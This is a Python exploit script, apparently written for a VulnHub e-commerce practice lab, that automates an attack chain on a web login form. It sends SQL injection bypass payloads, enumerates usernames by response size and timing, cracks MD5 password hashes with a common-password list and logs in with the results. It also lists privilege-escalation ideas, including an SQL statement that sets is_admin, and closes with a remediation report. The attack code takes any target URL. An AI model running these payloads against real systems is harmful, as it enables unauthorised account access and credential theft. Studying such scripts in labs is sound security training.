#!/usr/bin/env python3
"""
Authentication Bypass Exploit for VulnHub E-commerce
Author: Chris Cortes
Target: Login functionality
Impact: Unauthorized account access, admin privilege escalation

This script demonstrates multiple authentication vulnerabilities:
1. SQL injection in login form
2. Weak password hashing (MD5)
3. Username enumeration
4. Session fixation

OWASP Top 10 2021: A07 - Identification and Authentication Failures
CWE-287: Improper Authentication
"""

import requests
import sys
from urllib.parse import urljoin
import hashlib
import time

class AuthBypassExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.login_url = urljoin(base_url, '/login')
        
    def banner(self):
        """Display exploit banner"""
        print("=" * 60)
        print("Authentication Bypass Exploit - VulnHub E-commerce")
        print("Target: Login Functionality")
        print("=" * 60)
        print()
    
    def sqli_auth_bypass(self):
        """Attempt SQL injection authentication bypass"""
        print("[*] Method 1: SQL Injection Authentication Bypass")
        print("=" * 60)
        print()
        
        payloads = [
            ("admin' OR '1'='1'--", "password", "Classic OR bypass"),
            ("admin' --", "anything", "Comment out password check"),
            ("' OR 1=1--", "anything", "Universal OR bypass"),
            ("admin' OR '1'='1' /*", "anything", "Comment bypass"),
        ]
        
        print("[*] Testing SQL injection payloads...")
        print()
        
        for username, password, description in payloads:
            print(f"[*] Trying: {description}")
            print(f"    Username: {username}")
            print(f"    Password: {password}")
            
            data = {
                'username': username,
                'password': password
            }
            
            try:
                response = self.session.post(self.login_url, data=data, allow_redirects=True)
                
                if response.status_code == 200:
                    if 'Logout' in response.text or 'user' in response.text.lower():
                        print(f"[+] SUCCESS! Bypassed authentication!")
                        print(f"[+] Logged in without valid credentials")
                        return True
                    else:
                        print(f"[-] Failed - Login rejected")
                else:
                    print(f"[-] Failed - Status: {response.status_code}")
                    
            except Exception as e:
                print(f"[-] Error: {e}")
            
            print()
            time.sleep(0.5)
        
        print("[-] SQL injection bypass unsuccessful")
        print("[*] Application may have basic SQL injection protection")
        print()
        return False
    
    def username_enumeration(self):
        """Test for username enumeration vulnerability"""
        print("\n[*] Method 2: Username Enumeration")
        print("=" * 60)
        print()
        
        print("[*] Testing if application leaks user existence...")
        print()
        
        test_users = [
            ('admin', True),
            ('user', True),
            ('alice', True),
            ('nonexistent_user_123', False),
            ('attacker', False),
        ]
        
        results = []
        
        for username, should_exist in test_users:
            data = {
                'username': username,
                'password': 'wrong_password'
            }
            
            try:
                response = self.session.post(self.login_url, data=data, allow_redirects=False)
                
                response_length = len(response.text)
                response_time = response.elapsed.total_seconds()
                
                results.append({
                    'username': username,
                    'exists': should_exist,
                    'length': response_length,
                    'time': response_time
                })
                
                print(f"User: {username:20} | Length: {response_length:6} | Time: {response_time:.3f}s")
                
            except Exception as e:
                print(f"Error testing {username}: {e}")
            
            time.sleep(0.3)
        
        print()
        print("[*] Analysis:")
        
        # Check if response patterns differ for valid/invalid users
        valid_lengths = [r['length'] for r in results if r['exists']]
        invalid_lengths = [r['length'] for r in results if not r['exists']]
        
        if len(set(valid_lengths)) == 1 and len(set(invalid_lengths)) == 1:
            if valid_lengths[0] != invalid_lengths[0]:
                print("[!] Username enumeration possible!")
                print(f"    Valid users: {valid_lengths[0]} bytes")
                print(f"    Invalid users: {invalid_lengths[0]} bytes")
                print("[!] Attacker can enumerate valid usernames")
            else:
                print("[+] Response sizes consistent - enumeration harder")
        else:
            print("[*] Response patterns unclear - manual analysis needed")
        
        print()
    
    def md5_hash_crack(self):
        """Demonstrate MD5 hash cracking"""
        print("\n[*] Method 3: MD5 Hash Cracking")
        print("=" * 60)
        print()
        
        print("[*] Application uses MD5 for password hashing")
        print("[*] MD5 is cryptographically broken and fast to crack")
        print()
        
        # Known hashes from database
        known_hashes = {
            "admin": "0192023a7bbd73250516f069df18b500",
            "user": "5f4dcc3b5aa765d61d8327deb882cf99",
            "alice": "6384e2b2184bcbf58eccf10ca7a6563c",
            "bob": "9f9d51bc70ef21ca5c14f307980a29d8",
        }
        
        # Common passwords to test
        common_passwords = [
            'password', 'admin123', 'alice123', 'bob123',
            '123456', 'password123', 'admin', 'letmein',
            'welcome', 'monkey', 'qwerty', '111111'
        ]
        
        print("[*] Attempting to crack MD5 hashes with common passwords...")
        print()
        
        cracked = {}
        
        for username, hash_val in known_hashes.items():
            print(f"[*] Cracking {username}: {hash_val}")
            
            for password in common_passwords:
                test_hash = hashlib.md5(password.encode()).hexdigest()
                
                if test_hash == hash_val:
                    print(f"[+] CRACKED! Password: {password}")
                    cracked[username] = password
                    break
            else:
                print(f"[-] Not found in common passwords")
            
            print()
        
        if cracked:
            print(f"[+] Successfully cracked {len(cracked)} passwords!")
            print()
            print("Cracked Credentials:")
            print("-" * 40)
            for username, password in cracked.items():
                print(f"  {username:10} : {password}")
            print()
            
            return cracked
        
        return {}
    
    def test_cracked_credentials(self, credentials):
        """Test cracked credentials by logging in"""
        print("\n[*] Method 4: Logging in with Cracked Credentials")
        print("=" * 60)
        print()
        
        for username, password in credentials.items():
            print(f"[*] Attempting login: {username} / {password}")
            
            data = {
                'username': username,
                'password': password
            }
            
            try:
                response = self.session.post(self.login_url, data=data, allow_redirects=True)
                
                if 'Logout' in response.text:
                    print(f"[+] SUCCESS! Logged in as {username}")
                    
                    # Check for admin access
                    if 'Admin' in response.text:
                        print(f"[!] CRITICAL: {username} has admin privileges!")
                    
                    print()
                    return True
                else:
                    print(f"[-] Login failed")
                    
            except Exception as e:
                print(f"[-] Error: {e}")
            
            print()
        
        return False
    
    def session_analysis(self):
        """Analyze session management"""
        print("\n[*] Method 5: Session Management Analysis")
        print("=" * 60)
        print()
        
        print("[*] Checking session cookie security...")
        
        # Make a request and check cookies
        response = self.session.get(self.base_url)
        cookies = self.session.cookies.get_dict()
        
        if cookies:
            print(f"[*] Found {len(cookies)} cookie(s)")
            
            for name, value in cookies.items():
                print(f"\n  Cookie: {name}")
                print(f"  Value: {value}")
                
                # Check cookie attributes
                cookie = self.session.cookies._cookies.get(self.base_url.split('//')[1].split(':')[0])
                if cookie and name in cookie.get('/', {}):
                    cookie_obj = cookie['/'][name]
                    
                    print(f"  HTTPOnly: {cookie_obj.has_nonstandard_attr('httponly')}")
                    print(f"  Secure: {cookie_obj.secure}")
                    print(f"  SameSite: {cookie_obj.get_nonstandard_attr('samesite', 'Not set')}")
                
                # Check if predictable
                if len(value) < 32:
                    print(f"  [!] Warning: Cookie appears short/predictable")
        else:
            print("[*] No cookies set before authentication")
        
        print()
    
    def demonstrate_privilege_escalation(self):
        """Demonstrate potential privilege escalation"""
        print("\n[*] Method 6: Privilege Escalation")
        print("=" * 60)
        print()
        
        print("[*] Potential privilege escalation vectors:")
        print()
        print("  1. Parameter Manipulation")
        print("     - Modify is_admin field in registration")
        print("     - Example: POST /register with is_admin=true")
        print()
        print("  2. Session Token Manipulation")
        print("     - Modify user_id in session cookie")
        print("     - Set admin flag in JWT if used")
        print()
        print("  3. SQL Injection")
        print("     - Update user role via SQLi")
        print("     - UPDATE users SET is_admin=1 WHERE username='user'")
        print()
    
    def generate_auth_report(self):
        """Generate authentication security report"""
        print("\n" + "=" * 60)
        print("Authentication Security Assessment")
        print("=" * 60)
        print()
        print("Vulnerabilities Found:")
        print()
        print("  1. Weak Password Hashing (MD5)")
        print("     Severity: HIGH")
        print("     Impact: Passwords easily crackable")
        print("     CWE: CWE-327 (Use of Broken Cryptography)")
        print()
        print("  2. Username Enumeration")
        print("     Severity: MEDIUM")
        print("     Impact: Attackers can identify valid accounts")
        print("     CWE: CWE-204 (Observable Response Discrepancy)")
        print()
        print("  3. Potential SQL Injection")
        print("     Severity: CRITICAL")
        print("     Impact: Authentication bypass")
        print("     CWE: CWE-89 (SQL Injection)")
        print()
        print("  4. Missing Security Headers")
        print("     Severity: LOW")
        print("     Impact: Reduced defense in depth")
        print()
        print("Remediation Priorities:")
        print()
        print("  1. Implement bcrypt/Argon2 for password hashing")
        print("     ❌ password = hashlib.md5(password).hexdigest()")
        print("     ✅ password = bcrypt.hashpw(password, bcrypt.gensalt())")
        print()
        print("  2. Use parameterized queries")
        print("     ❌ query = f\"SELECT * FROM users WHERE username='{username}'\"")
        print("     ✅ query = \"SELECT * FROM users WHERE username=?\"")
        print()
        print("  3. Consistent error messages")
        print("     ❌ \"Invalid username\" vs \"Invalid password\"")
        print("     ✅ \"Invalid credentials\" for all failures")
        print()
        print("  4. Implement account lockout")
        print("     - Limit failed login attempts")
        print("     - Add CAPTCHA after N failures")
        print()
        print("  5. Multi-factor authentication (MFA)")
        print("     - TOTP/SMS codes")
        print("     - Reduce impact of password compromise")
        print()
        print("  6. Security headers")
        print("     - X-Frame-Options")
        print("     - X-Content-Type-Options")
        print("     - Strict-Transport-Security")
        print("=" * 60)
    
    def run(self):
        """Execute the complete exploitation chain"""
        self.banner()
        
        # Method 1: SQL injection bypass
        self.sqli_auth_bypass()
        
        # Method 2: Username enumeration
        self.username_enumeration()
        
        # Method 3: Hash cracking
        cracked_creds = self.md5_hash_crack()
        
        # Method 4: Test cracked credentials
        if cracked_creds:
            self.test_cracked_credentials(cracked_creds)
        
        # Method 5: Session analysis
        self.session_analysis()
        
        # Method 6: Privilege escalation
        self.demonstrate_privilege_escalation()
        
        # Generate report
        self.generate_auth_report()
        
        print("\n[+] Authentication security assessment complete!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
    
    base_url = sys.argv[1]
    
    # Create and run exploit
    exploit = AuthBypassExploit(base_url)
    exploit.run()


if __name__ == "__main__":
    main()